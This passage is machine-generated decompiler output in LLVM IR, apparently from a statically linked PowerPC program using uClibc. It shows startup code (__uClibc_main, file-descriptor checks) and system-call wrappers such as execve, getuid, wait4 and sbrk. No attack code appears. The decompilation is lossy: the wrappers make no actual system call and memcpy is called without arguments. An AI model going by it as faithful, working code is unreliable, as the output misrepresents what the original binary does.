  br i1 %v3_1000f64c, label %dec_label_pc_1000f644.dec_label_pc_1000f65c_crit_edge, label %dec_label_pc_1000f654

dec_label_pc_1000f644.dec_label_pc_1000f65c_crit_edge: ; preds = %dec_label_pc_1000f644
  %v0_1000f66c.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_1000f65c

dec_label_pc_1000f654:                            ; preds = %dec_label_pc_1000f644
  %v2_1000f658 = load i32, i32* @r4, align 4
  %v3_1000f658 = call i32 @unknown_0(i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32 %v2_1000f658)
  br label %dec_label_pc_1000f65c

dec_label_pc_1000f65c:                            ; preds = %dec_label_pc_1000f644.dec_label_pc_1000f65c_crit_edge, %dec_label_pc_1000f654
  %v0_1000f66c = phi i32 [ %v0_1000f66c.pre, %dec_label_pc_1000f644.dec_label_pc_1000f65c_crit_edge ], [ %v3_1000f658, %dec_label_pc_1000f654 ]
  ret i32 %v0_1000f66c

; uselistorder directives
  uselistorder i32 (i32, i32)* @unknown_0, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000f65c, { 1, 0 }
  uselistorder label %dec_label_pc_1000f644, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void() local_unnamed_addr {
entry:
  %v0_1000f678 = load i32, i32* @r3, align 4
  ret i32 %v0_1000f678
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r30, align 4
  store i32 %arg1, i32* @r31, align 4
  store i32 268498592, i32* @lr, align 4
  %v2_1000f69c = call i32 @__libc_fcntl(i32 1, i32 1)
  %v3_1000f6a0 = icmp eq i32 %v2_1000f69c, -1
  br i1 %v3_1000f6a0, label %dec_label_pc_1000f6a8, label %dec_label_pc_1000f6c8

dec_label_pc_1000f6a8:                            ; preds = %entry
  %v0_1000f6ac = load i32, i32* @r30, align 4
  store i32 268498620, i32* @lr, align 4
  %v3_1000f6b8 = call i32 @__libc_open(i32 ptrtoint ([10 x i8]* @global_var_1001d4cc.906 to i32), i32 %v0_1000f6ac)
  %v1_1000f6bc = load i32, i32* @r31, align 4
  %v4_1000f6bc = icmp eq i32 %v3_1000f6b8, %v1_1000f6bc
  br i1 %v4_1000f6bc, label %dec_label_pc_1000f6c8, label %dec_label_pc_1000f6c4

dec_label_pc_1000f6c4:                            ; preds = %dec_label_pc_1000f6a8
  %v1_1000f6c4 = call i32 @abort(i32 %v3_1000f6b8)
  br label %dec_label_pc_1000f6c8

dec_label_pc_1000f6c8:                            ; preds = %entry, %dec_label_pc_1000f6a8, %dec_label_pc_1000f6c4
  %v0_1000f6d8 = phi i32 [ %v2_1000f69c, %entry ], [ %v3_1000f6b8, %dec_label_pc_1000f6a8 ], [ %v1_1000f6c4, %dec_label_pc_1000f6c4 ]
  ret i32 %v0_1000f6d8

; uselistorder directives
  uselistorder i32 (i32, i32)* @__libc_open, { 0, 3, 5, 4, 2, 1 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 0, 5, 7, 6, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_1000f6c8, { 2, 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %v3_1000f6fc = load i32, i32* @global_var_1002e644.907, align 4
  %v3_1000f700 = icmp eq i32 %v3_1000f6fc, 0
  br i1 %v3_1000f700, label %dec_label_pc_1000f724, label %dec_label_pc_1000f748

dec_label_pc_1000f724:                            ; preds = %entry
  store i32 1, i32* @global_var_1002e644.907, align 4
  store i32 4096, i32* @global_var_1002e638.824, align 4
  br i1 icmp eq (i32 add (i32 ptrtoint (i32* @global_var_10010000.9 to i32), i32 -18348), i32 0), label %dec_label_pc_1000f748, label %dec_label_pc_1000f734

dec_label_pc_1000f734:                            ; preds = %dec_label_pc_1000f724
  %v1_1000f744 = call i32 @_stdio_init(i32 add (i32 ptrtoint (i32* @global_var_10010000.9 to i32), i32 -18348))
  store i32 %v1_1000f744, i32* @r3, align 4
  br label %dec_label_pc_1000f748

dec_label_pc_1000f748:                            ; preds = %entry, %dec_label_pc_1000f724, %dec_label_pc_1000f734
  %v0_1000f758 = load i32, i32* @r3, align 4
  ret i32 %v0_1000f758

; uselistorder directives
  uselistorder label %dec_label_pc_1000f748, { 2, 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  store i32 %tmp, i32* @r30, align 4
  %v1_1000f774 = mul i32 %arg2, 4
  %v2_1000f778 = add i32 %tmp, %v1_1000f774
  %v0_1000f77c = load i32, i32* @r9, align 4
  store i32 %v0_1000f77c, i32* @global_var_1002e630.908, align 4
  %v1_1000f780 = add i32 %v2_1000f778, 4
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r29.global-to-local, align 4
  store i32 %v1_1000f780, i32* @global_var_1002e634.902, align 4
  store i32 %arg6, i32* @global_var_1002e640.905, align 4
  store i32 %arg2, i32* @r26, align 4
  store i32 %arg1, i32* @r25, align 4
  store i32 %arg4, i32* @r28, align 4
  %v2_1000f7a0 = load i32, i32* %arg3, align 4
  store i32 %arg5, i32* @r27, align 4
  %v4_1000f7a8 = icmp eq i32 %v1_1000f780, %v2_1000f7a0
  br i1 %v4_1000f7a8, label %dec_label_pc_1000f7b0, label %dec_label_pc_1000f7b4

dec_label_pc_1000f7b0:                            ; preds = %entry
  store i32 %v2_1000f778, i32* @global_var_1002e634.902, align 4
  br label %dec_label_pc_1000f7b4

dec_label_pc_1000f7b4:                            ; preds = %entry, %dec_label_pc_1000f7b0
  %v2_1000f7b4 = ptrtoint i32* %stack_var_-168 to i32
  store i32 268498884, i32* @lr, align 4
  %v3_1000f7c0 = call i32 @__GI_memset(i32 %v2_1000f7b4, i32 0, i32 120)
  %storemerge.pre = load i32, i32* @global_var_1002e634.902, align 4
  br label %dec_label_pc_1000f7d0

dec_label_pc_1000f7d0:                            ; preds = %dec_label_pc_1000f7d0, %dec_label_pc_1000f7b4
  %storemerge = phi i32 [ %storemerge.pre, %dec_label_pc_1000f7b4 ], [ %v1_1000f7d4, %dec_label_pc_1000f7d0 ]
  %v1_1000f7d0 = inttoptr i32 %storemerge to i32*
  %v2_1000f7d0 = load i32, i32* %v1_1000f7d0, align 4
  %v1_1000f7d4 = add i32 %storemerge, 4
  %v3_1000f7d8 = icmp eq i32 %v2_1000f7d0, 0
  br i1 %v3_1000f7d8, label %dec_label_pc_1000f7e0, label %dec_label_pc_1000f7d0

dec_label_pc_1000f7e0:                            ; preds = %dec_label_pc_1000f7d0
  store i32 %v1_1000f7d4, i32* %r29.global-to-local, align 4
  %v1_1000f80c12 = inttoptr i32 %v1_1000f7d4 to i32*
  %v2_1000f80c13 = load i32, i32* %v1_1000f80c12, align 4
  %v3_1000f81016 = icmp eq i32 %v2_1000f80c13, 0
  br i1 %v3_1000f81016, label %dec_label_pc_1000f818, label %dec_label_pc_1000f7e8

dec_label_pc_1000f7e8:                            ; preds = %dec_label_pc_1000f7e0, %dec_label_pc_1000f808
  %v0_1000f7fc = phi i32 [ %v1_1000f808, %dec_label_pc_1000f808 ], [ %v1_1000f7d4, %dec_label_pc_1000f7e0 ]
  %v0_1000f7f0 = phi i32 [ %v2_1000f80c, %dec_label_pc_1000f808 ], [ %v2_1000f80c13, %dec_label_pc_1000f7e0 ]
  %v2_1000f7e8 = icmp ugt i32 %v0_1000f7f0, 14
  br i1 %v2_1000f7e8, label %dec_label_pc_1000f808, label %dec_label_pc_1000f7f0

dec_label_pc_1000f7f0:                            ; preds = %dec_label_pc_1000f7e8
  %v1_1000f7f0 = mul i32 %v0_1000f7f0, 8
  %v2_1000f7f8 = add i32 %v1_1000f7f0, %v2_1000f7b4
  store i32 %v2_1000f7f8, i32* @r3, align 4
  store i32 %v0_1000f7fc, i32* @r4, align 4
  store i32 8, i32* @r5, align 4
  store i32 268498952, i32* @lr, align 4
  %v0_1000f804 = call i32 @memcpy()
  %v0_1000f808.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000f808

dec_label_pc_1000f808:                            ; preds = %dec_label_pc_1000f7e8, %dec_label_pc_1000f7f0
  %v0_1000f808 = phi i32 [ %v0_1000f7fc, %dec_label_pc_1000f7e8 ], [ %v0_1000f808.pre, %dec_label_pc_1000f7f0 ]
  %v1_1000f808 = add i32 %v0_1000f808, 8
  store i32 %v1_1000f808, i32* %r29.global-to-local, align 4
  %v1_1000f80c = inttoptr i32 %v1_1000f808 to i32*
  %v2_1000f80c = load i32, i32* %v1_1000f80c, align 4
  %v3_1000f810 = icmp eq i32 %v2_1000f80c, 0
  br i1 %v3_1000f810, label %dec_label_pc_1000f818, label %dec_label_pc_1000f7e8

dec_label_pc_1000f818:                            ; preds = %dec_label_pc_1000f808, %dec_label_pc_1000f7e0
  %v1_1000f81c = call i32 @_dl_aux_init(i32 %v2_1000f7b4)
  store i32 %v1_1000f81c, i32* @r3, align 4
  store i32 268498980, i32* @lr, align 4
  %v1_1000f820 = call i32 @__GI___uClibc_init(i32 %v1_1000f81c)
  %v3_1000f828 = icmp eq i32 %tmp27, 0
  br i1 %v3_1000f828, label %dec_label_pc_1000f830, label %dec_label_pc_1000f834

dec_label_pc_1000f830:                            ; preds = %dec_label_pc_1000f818
  br label %dec_label_pc_1000f834

dec_label_pc_1000f834:                            ; preds = %dec_label_pc_1000f818, %dec_label_pc_1000f830
  %v0_1000f83c = phi i32 [ %tmp27, %dec_label_pc_1000f818 ], [ 4096, %dec_label_pc_1000f830 ]
  store i32 %v0_1000f83c, i32* @global_var_1002e638.824, align 4
  %v3_1000f840 = icmp eq i32 %tmp26, -1
  br i1 %v3_1000f840, label %dec_label_pc_1000f848, label %dec_label_pc_1000f87c

dec_label_pc_1000f848:                            ; preds = %dec_label_pc_1000f834
  store i32 268499020, i32* @lr, align 4
  %v1_1000f848 = call i32 @getuid(i32 ptrtoint (i32* @global_var_10030000.1 to i32))
  store i32 %v1_1000f848, i32* %r29.global-to-local, align 4
  store i32 268499028, i32* @lr, align 4
  %v0_1000f850 = call i32 @geteuid()
  %v4_1000f854 = icmp eq i32 %v1_1000f848, %v0_1000f850
  br i1 %v4_1000f854, label %dec_label_pc_1000f85c, label %dec_label_pc_1000f898

dec_label_pc_1000f85c:                            ; preds = %dec_label_pc_1000f848
  store i32 268499040, i32* @lr, align 4
  %v1_1000f85c = call i32 @getgid(i32 %v0_1000f850)
  store i32 %v1_1000f85c, i32* %r29.global-to-local, align 4
  store i32 268499048, i32* @lr, align 4
  %v0_1000f864 = call i32 @getegid()
  %v4_1000f868 = icmp eq i32 %v1_1000f85c, %v0_1000f864
  br i1 %v4_1000f868, label %dec_label_pc_1000f870.thread, label %dec_label_pc_1000f898

dec_label_pc_1000f870.thread:                     ; preds = %dec_label_pc_1000f85c
  br label %dec_label_pc_1000f8c8

dec_label_pc_1000f87c:                            ; preds = %dec_label_pc_1000f834
  %v4_1000f880 = icmp eq i32 %tmp26, %tmp25
  br i1 %v4_1000f880, label %dec_label_pc_1000f888, label %dec_label_pc_1000f898

dec_label_pc_1000f888:                            ; preds = %dec_label_pc_1000f87c
  br label %dec_label_pc_1000f898

dec_label_pc_1000f898:                            ; preds = %dec_label_pc_1000f888, %dec_label_pc_1000f87c, %dec_label_pc_1000f85c, %dec_label_pc_1000f848
  store i32 268499112, i32* @lr, align 4
  %v2_1000f8a4 = call i32 @__check_one_fd(i32 0, i32 32768)
  store i32 268499128, i32* @lr, align 4
  %v2_1000f8b4 = call i32 @__check_one_fd(i32 1, i32 32770)
  store i32 268499144, i32* @lr, align 4
  %v2_1000f8c4 = call i32 @__check_one_fd(i32 2, i32 32770)
  br label %dec_label_pc_1000f8c8

dec_label_pc_1000f8c8:                            ; preds = %dec_label_pc_1000f870.thread, %dec_label_pc_1000f898
  %v0_1000f8d4 = load i32, i32* @r30, align 4
  %v1_1000f8d4 = inttoptr i32 %v0_1000f8d4 to i32*
  %v2_1000f8d4 = load i32, i32* %v1_1000f8d4, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v2_1000f8d4, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32 -6692) to i32*), align 4
  %v0_1000f8f4 = load i32, i32* @r27, align 4
  store i32 %v0_1000f8f4, i32* @global_var_1002e63c.904, align 4
  br i1 false, label %dec_label_pc_1000f8fc, label %dec_label_pc_1000f974

dec_label_pc_1000f8fc:                            ; preds = %dec_label_pc_1000f8c8, %dec_label_pc_1000f8fc
  br i1 undef, label %dec_label_pc_1000f8fc, label %dec_label_pc_1000f974

dec_label_pc_1000f974:                            ; preds = %dec_label_pc_1000f8fc, %dec_label_pc_1000f8c8
  %v0_1000f920 = load i32, i32* @r28, align 4
  call void @__pseudo_call(i32 %v0_1000f920)
  store i32 0, i32* %r29.global-to-local, align 4
  br i1 icmp eq (i32 add (i32 ptrtoint (i32* @global_var_10010000.9 to i32), i32 -19896), i32 0), label %dec_label_pc_1000f990, label %dec_label_pc_1000f984

dec_label_pc_1000f984:                            ; preds = %dec_label_pc_1000f974
  %v0_1000f984 = call i32 @__errno_location()
  %v2_1000f98c = inttoptr i32 %v0_1000f984 to i32*
  store i32 0, i32* %v2_1000f98c, align 4
  br label %dec_label_pc_1000f990

dec_label_pc_1000f990:                            ; preds = %dec_label_pc_1000f974, %dec_label_pc_1000f984
  br i1 icmp eq (i32 add (i32 ptrtoint (i32* @global_var_10010000.9 to i32), i32 -852), i32 0), label %dec_label_pc_1000f9ac, label %dec_label_pc_1000f9a0

dec_label_pc_1000f9a0:                            ; preds = %dec_label_pc_1000f990
  %v0_1000f9a0 = call i32 @__GI___h_errno_location()
  %v2_1000f9a8 = inttoptr i32 %v0_1000f9a0 to i32*
  store i32 0, i32* %v2_1000f9a8, align 4
  br label %dec_label_pc_1000f9ac

dec_label_pc_1000f9ac:                            ; preds = %dec_label_pc_1000f990, %dec_label_pc_1000f9a0
  %v0_1000f9b8 = load i32, i32* @r25, align 4
  call void @__pseudo_call(i32 %v0_1000f9b8)
  %v0_1000f9c4 = call i32 @__GI_exit()
  ret i32 %v0_1000f9c4

; uselistorder directives
  uselistorder i32 %v2_1000f80c, { 1, 0 }
  uselistorder i32 %v1_1000f808, { 2, 1, 0 }
  uselistorder i32 %v1_1000f7d4, { 0, 2, 1, 3 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v2_1000f7b4, { 1, 0, 2 }
  uselistorder i32* %r29.global-to-local, { 1, 2, 3, 4, 6, 5, 0, 7 }
  uselistorder i32 ()* @__GI_exit, { 0, 5, 4, 2, 3, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_10010000.9 to i32), { 0, 1, 2, 3, 28, 4, 5, 9, 10, 8, 11, 7, 12, 6, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 29, 23, 24, 25, 27, 26 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 4096, { 1, 3, 14, 15, 2, 13, 4, 5, 6, 7, 8, 9, 10, 11, 0, 12 }
  uselistorder i32 14, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_1000f9ac, { 1, 0 }
  uselistorder label %dec_label_pc_1000f990, { 1, 0 }
  uselistorder label %dec_label_pc_1000f8fc, { 1, 0 }
  uselistorder label %dec_label_pc_1000f8c8, { 1, 0 }
  uselistorder label %dec_label_pc_1000f834, { 1, 0 }
  uselistorder label %dec_label_pc_1000f808, { 1, 0 }
  uselistorder label %dec_label_pc_1000f7e8, { 1, 0 }
  uselistorder label %dec_label_pc_1000f7b4, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %v0_1000f9d4 = load i32, i32* @r3, align 4
  store i32 %v0_1000f9d4, i32* @r29, align 4
  %v0_1000f9dc = call i32 @__errno_location()
  %v0_1000f9e0 = load i32, i32* @r29, align 4
  %v2_1000f9e0 = inttoptr i32 %v0_1000f9dc to i32*
  store i32 %v0_1000f9e0, i32* %v2_1000f9e0, align 4
  ret i32 -1
}

define i32 @__socketcall(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000fa14 = call i32 @__asm_mfcr()
  %v1_1000fa18 = and i32 %v0_1000fa14, 268435456
  %v3_1000fa18 = icmp eq i32 %v1_1000fa18, 0
  store i32 %v0_1000fa14, i32* %r31.global-to-local, align 4
  br i1 %v3_1000fa18, label %dec_label_pc_1000fa30, label %dec_label_pc_1000fa24

dec_label_pc_1000fa24:                            ; preds = %entry
  %v0_1000fa24 = call i32 @__errno_location()
  %v0_1000fa28 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000fa28 = inttoptr i32 %v0_1000fa24 to i32*
  store i32 %v0_1000fa28, i32* %v2_1000fa28, align 4
  br label %dec_label_pc_1000fa30

dec_label_pc_1000fa30:                            ; preds = %entry, %dec_label_pc_1000fa24
  %v0_1000fa40 = phi i32 [ %v0_1000fa14, %entry ], [ -1, %dec_label_pc_1000fa24 ]
  ret i32 %v0_1000fa40

; uselistorder directives
  uselistorder label %dec_label_pc_1000fa30, { 1, 0 }
}

define i32 @__GI_execve(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000fa5c = call i32 @__asm_mfcr()
  %v1_1000fa60 = and i32 %v0_1000fa5c, 268435456
  %v3_1000fa60 = icmp eq i32 %v1_1000fa60, 0
  store i32 %v0_1000fa5c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000fa60, label %dec_label_pc_1000fa78, label %dec_label_pc_1000fa6c

dec_label_pc_1000fa6c:                            ; preds = %entry
  %v0_1000fa6c = call i32 @__errno_location()
  %v0_1000fa70 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000fa70 = inttoptr i32 %v0_1000fa6c to i32*
  store i32 %v0_1000fa70, i32* %v2_1000fa70, align 4
  br label %dec_label_pc_1000fa78

dec_label_pc_1000fa78:                            ; preds = %entry, %dec_label_pc_1000fa6c
  %v0_1000fa88 = phi i32 [ %v0_1000fa5c, %entry ], [ -1, %dec_label_pc_1000fa6c ]
  ret i32 %v0_1000fa88

; uselistorder directives
  uselistorder label %dec_label_pc_1000fa78, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000faa4 = call i32 @__asm_mfcr()
  %v1_1000faa8 = and i32 %v0_1000faa4, 268435456
  %v3_1000faa8 = icmp eq i32 %v1_1000faa8, 0
  store i32 %v0_1000faa4, i32* %r31.global-to-local, align 4
  br i1 %v3_1000faa8, label %dec_label_pc_1000fac0, label %dec_label_pc_1000fab4

dec_label_pc_1000fab4:                            ; preds = %entry
  %v0_1000fab4 = call i32 @__errno_location()
  %v0_1000fab8 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000fab8 = inttoptr i32 %v0_1000fab4 to i32*
  store i32 %v0_1000fab8, i32* %v2_1000fab8, align 4
  br label %dec_label_pc_1000fac0

dec_label_pc_1000fac0:                            ; preds = %entry, %dec_label_pc_1000fab4
  %v0_1000fad0 = phi i32 [ %v0_1000faa4, %entry ], [ -1, %dec_label_pc_1000fab4 ]
  ret i32 %v0_1000fad0

; uselistorder directives
  uselistorder label %dec_label_pc_1000fac0, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000faec = call i32 @__asm_mfcr()
  %v1_1000faf0 = and i32 %v0_1000faec, 268435456
  %v3_1000faf0 = icmp eq i32 %v1_1000faf0, 0
  store i32 %v0_1000faec, i32* %r31.global-to-local, align 4
  br i1 %v3_1000faf0, label %dec_label_pc_1000fb08, label %dec_label_pc_1000fafc

dec_label_pc_1000fafc:                            ; preds = %entry
  %v0_1000fafc = call i32 @__errno_location()
  %v0_1000fb00 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000fb00 = inttoptr i32 %v0_1000fafc to i32*
  store i32 %v0_1000fb00, i32* %v2_1000fb00, align 4
  br label %dec_label_pc_1000fb08

dec_label_pc_1000fb08:                            ; preds = %entry, %dec_label_pc_1000fafc
  %v0_1000fb18 = phi i32 [ %v0_1000faec, %entry ], [ -1, %dec_label_pc_1000fafc ]
  ret i32 %v0_1000fb18

; uselistorder directives
  uselistorder label %dec_label_pc_1000fb08, { 1, 0 }
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000fb34 = call i32 @__asm_mfcr()
  %v1_1000fb38 = and i32 %v0_1000fb34, 268435456
  %v3_1000fb38 = icmp eq i32 %v1_1000fb38, 0
  store i32 %v0_1000fb34, i32* %r31.global-to-local, align 4
  br i1 %v3_1000fb38, label %dec_label_pc_1000fb50, label %dec_label_pc_1000fb44

dec_label_pc_1000fb44:                            ; preds = %entry
  %v0_1000fb44 = call i32 @__errno_location()
  %v0_1000fb48 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000fb48 = inttoptr i32 %v0_1000fb44 to i32*
  store i32 %v0_1000fb48, i32* %v2_1000fb48, align 4
  br label %dec_label_pc_1000fb50

dec_label_pc_1000fb50:                            ; preds = %entry, %dec_label_pc_1000fb44
  %v0_1000fb60 = phi i32 [ %v0_1000fb34, %entry ], [ -1, %dec_label_pc_1000fb44 ]
  ret i32 %v0_1000fb60

; uselistorder directives
  uselistorder label %dec_label_pc_1000fb50, { 1, 0 }
}

define i32 @getuid(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000fb7c = call i32 @__asm_mfcr()
  %v1_1000fb80 = and i32 %v0_1000fb7c, 268435456
  %v3_1000fb80 = icmp eq i32 %v1_1000fb80, 0
  store i32 %v0_1000fb7c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000fb80, label %dec_label_pc_1000fb98, label %dec_label_pc_1000fb8c

dec_label_pc_1000fb8c:                            ; preds = %entry
  %v0_1000fb8c = call i32 @__errno_location()
  %v0_1000fb90 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000fb90 = inttoptr i32 %v0_1000fb8c to i32*
  store i32 %v0_1000fb90, i32* %v2_1000fb90, align 4
  br label %dec_label_pc_1000fb98

dec_label_pc_1000fb98:                            ; preds = %entry, %dec_label_pc_1000fb8c
  %v0_1000fba8 = phi i32 [ %v0_1000fb7c, %entry ], [ -1, %dec_label_pc_1000fb8c ]
  ret i32 %v0_1000fba8

; uselistorder directives
  uselistorder label %dec_label_pc_1000fb98, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000fbc4 = call i32 @__asm_mfcr()
  %v1_1000fbc8 = and i32 %v0_1000fbc4, 268435456
  %v3_1000fbc8 = icmp eq i32 %v1_1000fbc8, 0
  store i32 %v0_1000fbc4, i32* %r31.global-to-local, align 4
  br i1 %v3_1000fbc8, label %dec_label_pc_1000fbe0, label %dec_label_pc_1000fbd4

dec_label_pc_1000fbd4:                            ; preds = %entry
  %v0_1000fbd4 = call i32 @__errno_location()
  %v0_1000fbd8 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000fbd8 = inttoptr i32 %v0_1000fbd4 to i32*
  store i32 %v0_1000fbd8, i32* %v2_1000fbd8, align 4
  br label %dec_label_pc_1000fbe0

dec_label_pc_1000fbe0:                            ; preds = %entry, %dec_label_pc_1000fbd4
  %v0_1000fbf0 = phi i32 [ %v0_1000fbc4, %entry ], [ -1, %dec_label_pc_1000fbd4 ]
  ret i32 %v0_1000fbf0

; uselistorder directives
  uselistorder label %dec_label_pc_1000fbe0, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r30, align 4
  %v3_1000fc10 = load i32, i32* @global_var_1002e668.911, align 4
  %v3_1000fc14 = icmp eq i32 %v3_1000fc10, 0
  br i1 %v3_1000fc14, label %dec_label_pc_1000fc1c, label %dec_label_pc_1000fc28

dec_label_pc_1000fc1c:                            ; preds = %entry
  store i32 268500000, i32* @lr, align 4
  %v1_1000fc1c = call i32 @__GI_brk(i32 0)
  %v1_1000fc20 = icmp slt i32 %v1_1000fc1c, 0
  br i1 %v1_1000fc20, label %dec_label_pc_1000fc48, label %dec_label_pc_1000fc1c.dec_label_pc_1000fc28_crit_edge

dec_label_pc_1000fc1c.dec_label_pc_1000fc28_crit_edge: ; preds = %dec_label_pc_1000fc1c
  %v0_1000fc28.pre = load i32, i32* @r30, align 4
  %v3_1000fc2c.pre = load i32, i32* @global_var_1002e668.911, align 4
  br label %dec_label_pc_1000fc28

dec_label_pc_1000fc28:                            ; preds = %dec_label_pc_1000fc1c.dec_label_pc_1000fc28_crit_edge, %entry
  %v3_1000fc2c = phi i32 [ %v3_1000fc2c.pre, %dec_label_pc_1000fc1c.dec_label_pc_1000fc28_crit_edge ], [ %v3_1000fc10, %entry ]
  %v1_1000fc34 = phi i32 [ %v0_1000fc28.pre, %dec_label_pc_1000fc1c.dec_label_pc_1000fc28_crit_edge ], [ %arg1, %entry ]
  %v3_1000fc28 = icmp eq i32 %v1_1000fc34, 0
  store i32 %v3_1000fc2c, i32* @r31, align 4
  br i1 %v3_1000fc28, label %dec_label_pc_1000fc4c, label %dec_label_pc_1000fc3c

dec_label_pc_1000fc3c:                            ; preds = %dec_label_pc_1000fc28
  %v2_1000fc34 = add i32 %v1_1000fc34, %v3_1000fc2c
  store i32 268500032, i32* @lr, align 4
  %v1_1000fc3c = call i32 @__GI_brk(i32 %v2_1000fc34)
  %tmp6 = icmp sgt i32 %v1_1000fc3c, -1
  br i1 %tmp6, label %dec_label_pc_1000fc3c.dec_label_pc_1000fc4c_crit_edge, label %dec_label_pc_1000fc48

dec_label_pc_1000fc3c.dec_label_pc_1000fc4c_crit_edge: ; preds = %dec_label_pc_1000fc3c
  %v0_1000fc50.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000fc4c

dec_label_pc_1000fc48:                            ; preds = %dec_label_pc_1000fc3c, %dec_label_pc_1000fc1c
  store i32 -1, i32* @r31, align 4
  br label %dec_label_pc_1000fc4c

dec_label_pc_1000fc4c:                            ; preds = %dec_label_pc_1000fc3c.dec_label_pc_1000fc4c_crit_edge, %dec_label_pc_1000fc28, %dec_label_pc_1000fc48
  %v0_1000fc50 = phi i32 [ %v0_1000fc50.pre, %dec_label_pc_1000fc3c.dec_label_pc_1000fc4c_crit_edge ], [ %v3_1000fc2c, %dec_label_pc_1000fc28 ], [ -1, %dec_label_pc_1000fc48 ]
  ret i32 %v0_1000fc50

; uselistorder directives
  uselistorder i32 %v3_1000fc2c, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_1000fc4c, { 2, 0, 1 }
}

define i32 @wait4(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000fc7c = call i32 @__asm_mfcr()
  %v1_1000fc80 = and i32 %v0_1000fc7c, 268435456
  %v3_1000fc80 = icmp eq i32 %v1_1000fc80, 0
  store i32 %v0_1000fc7c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000fc80, label %dec_label_pc_1000fc98, label %dec_label_pc_1000fc8c

dec_label_pc_1000fc8c:                            ; preds = %entry
  %v0_1000fc8c = call i32 @__errno_location()
  %v0_1000fc90 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000fc90 = inttoptr i32 %v0_1000fc8c to i32*
  store i32 %v0_1000fc90, i32* %v2_1000fc90, align 4
  br label %dec_label_pc_1000fc98

dec_label_pc_1000fc98:                            ; preds = %entry, %dec_label_pc_1000fc8c
  %v0_1000fca8 = phi i32 [ %v0_1000fc7c, %entry ], [ -1, %dec_label_pc_1000fc8c ]
  ret i32 %v0_1000fca8

; uselistorder directives
  uselistorder label %dec_label_pc_1000fc98, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_1002e64c.912 to i32)
}

define i32 @__GI_wcrtomb(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_1000fcb8 = icmp eq i32 %arg1, 0
  store i32 %arg3, i32* @r7, align 4
  store i32 16, i32* @r6, align 4
  %v2_1000fcd4 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_1000fcd4, i32* @r4, align 4
  store i32 1, i32* @r5, align 4
  br i1 %v3_1000fcb8, label %dec_label_pc_1000fce0, label %dec_label_pc_1000fce8

dec_label_pc_1000fce0:                            ; preds = %entry
  %v2_1000fce0 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1000fce0, i32* @r3, align 4
  br label %dec_label_pc_1000fce8

dec_label_pc_1000fce8:                            ; preds = %entry, %dec_label_pc_1000fce0
  %v0_1000fcec = phi i32 [ %arg2, %entry ], [ 0, %dec_label_pc_1000fce0 ]
  %v2_1000fce8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v0_1000fcec, i32* %stack_var_-40, align 4
